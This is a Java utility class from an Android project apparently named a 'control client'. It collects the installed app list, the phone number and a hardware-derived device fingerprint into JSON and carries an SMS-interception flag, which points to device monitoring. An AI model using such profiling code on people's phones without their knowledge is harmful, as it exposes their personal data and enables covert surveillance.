package contol.android.kamike.com.contolclient.utils;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.FileIOUtils;
import com.blankj.utilcode.util.FileUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

import contol.android.kamike.com.contolclient.bean.AppInfoBean;
import contol.android.kamike.com.contolclient.bean.ClientInfoBean;

/**
 * Created by Administrator on 2017/9/24.
 */

public class AllUtils {
    public static String getClientInfo(Context context) {
        ClientInfoBean info = new ClientInfoBean();
        info.androidVersion = android.os.Build.VERSION.RELEASE;

        ArrayList<AppInfoBean> list=new ArrayList<>();
        for(AppUtils.AppInfo app:AppUtils.getAppsInfo()){
            AppInfoBean myApp=new AppInfoBean();
            myApp.isSystem=app.isSystem();
            myApp.name=app.getName();
            //myApp.packageName=app.getPackageName();
            myApp.versionName=app.getVersionName();
            list.add(myApp);
        }
        info.appList =list ;

        info.deviceId = getUniquePsuedoID();
        info.isInterceptSMS = false;
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        info.phoneNumber = tm.getLine1Number();
        info.address="";
        return JSON.toJSONString(info);
    }

    public static String getUniquePsuedoID() {
        String serial = null;

        String m_szDevIDShort = "35" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +

                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +

                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +

                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +

                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +

                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +

                Build.USER.length() % 10; //13 位

        try {
            serial = android.os.Build.class.getField("SERIAL").get(null).toString();
            //API>=9 使用serial号
            return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
        } catch (Exception exception) {
            //serial需要一个初始化
            File file = new File(Environment.getExternalStorageDirectory() + "/test/uuid.txt");
            FileUtils.createOrExistsFile(file.getAbsolutePath());

            serial = FileIOUtils.readFile2String(file);
            if (TextUtils.isEmpty(serial)) {
                serial = UUID.randomUUID().toString();
                FileIOUtils.writeFileFromString(file, serial);
            }
        }
        //使用硬件信息拼凑出来的15位号码
        return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
    }
}
